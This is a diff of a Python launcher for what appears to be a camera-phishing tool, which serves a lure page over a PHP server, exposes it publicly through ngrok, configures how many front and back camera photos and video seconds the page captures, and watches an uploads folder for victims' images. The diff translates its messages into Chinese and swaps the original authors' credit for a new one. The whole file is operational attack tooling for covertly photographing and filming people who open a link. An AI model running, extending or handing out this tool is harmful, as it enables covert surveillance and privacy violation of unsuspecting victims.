@@ -3,12 +3,26 @@ from datetime import datetime
 try:
     from watchdog.observers import Observer
     from watchdog.events import FileSystemEventHandler
-except:
-    os.system('pip install watchdog')
+except ImportError:
+    print("Installing watchdog...")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "watchdog", "--break-system-packages"])
+    except subprocess.CalledProcessError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "watchdog"])
+        
+    from watchdog.observers import Observer
+    from watchdog.events import FileSystemEventHandler
+
 try:
     from colorama import init,Fore
-except:
-    os.system('pip install colorama')
+except ImportError:
+    print("Installing colorama...")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"])
+    except subprocess.CalledProcessError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
+        
+    from colorama import init,Fore
 
 init()  
 
@@ -32,7 +46,7 @@ messages = {
     "error": f"{colors['red']}[{colors['light_red']}-{colors['red']}] {colors['light_red']}"
 }
 
-PHP_PORT = random.randint(8000,8999)
+PHP_PORT = 8080
 PHP_FOLDER = "./"  
 FOLDER_TO_WATCH = "uploads"
 INDEX = "index.html"
@@ -52,10 +66,10 @@ if not shutil.which("php"):
         subprocess.run(["pkg", "install", "php"])
     elif 'Linux' in __import__("platform").system():
         subprocess.run(["sudo", "apt", "install","php"])
-    print(f"\n{messages['error']}Php is NOT installed!\n\nInstall On Windows: https://www.php.net/downloads.php")
+    print(f"\n{messages['error']}PHP未安装！\n\nWindows安装地址: https://www.php.net/downloads.php")
 
 if not shutil.which("ngrok"):
-    sys.exit(f"\n{messages['error']}ngrok is NOT installed!\n\nInstall On windows: winget install ngrok -s msstore\nOr Download Portable: https://ngrok.com/download/windows?tab=download\n\nInstall On Termux: \npkg update -y\npkg install git\ngit clone https://github.com/Yisus7u7/termux-ngrok\ncd termux-ngrok\nbash install.sh\n\nInstall On Linux: https://ngrok.com/download/linux\n\nAnd then add your token (ngrok config add-authtoken <token>)")
+    print(f"\n{messages['error']}ngrok未安装！将无法进行内网穿透。\n\nWindows安装命令: winget install ngrok -s msstore\n或者下载便携版: https://ngrok.com/download/windows?tab=download\n\nTermux安装命令: \npkg update -y\npkg install git\ngit clone https://github.com/Yisus7u7/termux-ngrok\ncd termux-ngrok\nbash install.sh\n\nLinux下载地址: https://ngrok.com/download/linux\n\n安装后请添加你的token (ngrok config add-authtoken <token>)")
 
 def tokenngrok():
     if os.path.isfile(TOKEN_FILE):
@@ -73,7 +87,7 @@ if OS():
 ██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
 ▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
 
-    {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n                                       
+    {colors['red']}by:Xheishou.com-x@root{colors['reset']}\n\n                                       
 """
 else:
     if 'Linux' in __import__("platform").system():
@@ -93,28 +107,34 @@ else:
              `  \ \._,\ '/              '-----------'           | '.    | '. .'   \_.'  | '.    | '.  
                  `--'  `"                                       '---'   '---'           '---'   '---' 
 
-                {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n
+                {colors['red']}by:Xheishou.com-x@root{colors['reset']}\n\n
                  """
 
 print (b)
 token = tokenngrok()
 
 if not token:
-    user_token = input(f"{messages['true']}Enter Token Ngrok: {colors['reset']}")
-    with open(TOKEN_FILE, "w") as f:
-        f.write(user_token.strip())
-    subprocess.run(["ngrok", "config", "add-authtoken", user_token])
+    user_token = input(f"{messages['true']}请输入Ngrok Token (直接回车可跳过): {colors['reset']}")
+    if user_token.strip():
+        with open(TOKEN_FILE, "w") as f:
+            f.write(user_token.strip())
+        if shutil.which("ngrok"):
+            subprocess.run(["ngrok", "config", "add-authtoken", user_token])
+        else:
+            print(f"{messages['error']}ngrok未安装，跳过配置命令。")
+    else:
+        print(f"{messages['true']}跳过Token设置，可能会导致ngrok连接受限。")
 
 clear()
 print (b)
 
-forindex = input(f"{messages['forindex']}Do you want to change the settings of the 'index.html' file? (y/n): {colors['reset']}").upper()
+forindex = input(f"{messages['forindex']}是否需要更改 'index.html' 文件的设置? (y/n): {colors['reset']}").upper()
 
 if forindex == "Y":
-    front_photo_count = input(f"{messages['forindex']}Front Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
-    back_photo_count = input(f"{messages['forindex']}Back Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
-    front_video_seconds = input(f"{messages['forindex']}Front Video Seconds {colors['yellow']}(e.g: 5){colors['reset']}: ")
-    back_video_seconds = input(f"{messages['forindex']}Back Video Seconds {colors['yellow']}(e.g: 4){colors['reset']}: ")
+    front_photo_count = input(f"{messages['forindex']}前置摄像头拍照数量 {colors['yellow']}(例如: 3){colors['reset']}: ")
+    back_photo_count = input(f"{messages['forindex']}后置摄像头拍照数量 {colors['yellow']}(例如: 3){colors['reset']}: ")
+    front_video_seconds = input(f"{messages['forindex']}前置摄像头录像秒数 {colors['yellow']}(例如: 5){colors['reset']}: ")
+    back_video_seconds = input(f"{messages['forindex']}后置摄像头录像秒数 {colors['yellow']}(例如: 4){colors['reset']}: ")
     patterns = {
         'frontPhotoCount': r'let frontPhotoCount = \d+;',
         'backPhotoCount': r'let backPhotoCount = \d+;',
@@ -136,7 +156,7 @@ if forindex == "Y":
     print(b)
 
 def php_server():
-    print(f"{messages['true']}Starting PHP server on port {colors['yellow']}{PHP_PORT}{colors['reset']}...")
+    print(f"{messages['true']}正在启动PHP服务器，端口 {colors['yellow']}{PHP_PORT}{colors['reset']}...")
     php_proc = subprocess.Popen(
         ["php", "-S", f"0.0.0.0:{PHP_PORT}"],
         cwd=PHP_FOLDER,
@@ -148,7 +168,7 @@ def php_server():
     return php_proc
 
 def ngrok(port):
-    print(f"{messages['true']}Starting ngrok on port {colors['yellow']}{port}{colors['reset']}...")
+    print(f"{messages['true']}正在启动ngrok，端口 {colors['yellow']}{port}{colors['reset']}...")
     ngrok_proc = subprocess.Popen(
         ["ngrok", "http", str(port)],
         stdout=subprocess.PIPE,
@@ -168,13 +188,13 @@ def ngrok_url():
         matches = re.findall(r"https://[0-9a-z]*\.ngrok-free\.app", output)
         if matches:
             for url in matches:
-                print(f"\n{messages['true']}public URL:", url)
+                print(f"\n{messages['true']}公开链接:", url)
             return matches
         else:
-            print(f"\n{messages['error']}No ngrok URL found. Use a VPN if you are banned")
+            print(f"\n{messages['error']}未找到ngrok链接。如果被封禁请使用VPN")
             exit()
     except Exception as e:
-        print(f"\n{messages['error']}Error:", e)
+        print(f"\n{messages['error']}错误:", e)
         return None
 
 class WatcherHandler(FileSystemEventHandler):
@@ -182,27 +202,33 @@ class WatcherHandler(FileSystemEventHandler):
         if not event.is_directory:
             file_name = os.path.basename(event.src_path)
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            print(f"\n{messages['true']}File received: {colors['green']}{file_name} {colors['red']}at {colors['yellow']}{current_time}")
+            print(f"\n{messages['true']}收到文件: {colors['green']}{file_name} {colors['red']}时间 {colors['yellow']}{current_time}")
 
 if __name__ == "__main__":
 
     php_proc = php_server()
-    ngrok_proc = ngrok(PHP_PORT)
-    ngrok_url()
+    
+    ngrok_proc = None
+    if shutil.which("ngrok"):
+        ngrok_proc = ngrok(PHP_PORT)
+        ngrok_url()
+    else:
+        print(f"\n{messages['error']}ngrok未安装，跳过启动ngrok服务。请手动配置端口映射或使用本地IP访问: http://127.0.0.1:{PHP_PORT}")
 
     event_handler = WatcherHandler()
     observer = Observer()
     observer.schedule(event_handler, FOLDER_TO_WATCH, recursive=False)
     observer.start()
-    print(f"\n{messages['true']}Photo capture Started => {colors['yellow']}{FOLDER_TO_WATCH}\n")
+    print(f"\n{messages['true']}照片捕获已启动 => {colors['yellow']}{FOLDER_TO_WATCH}\n")
 
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print(f"\n{colors['red']}Stopping servers and observer...")
+        print(f"\n{colors['red']}正在停止服务器和监听器...")
         php_proc.terminate()
-        ngrok_proc.terminate()
+        if ngrok_proc:
+            ngrok_proc.terminate()
         observer.stop()
 
         observer.join()
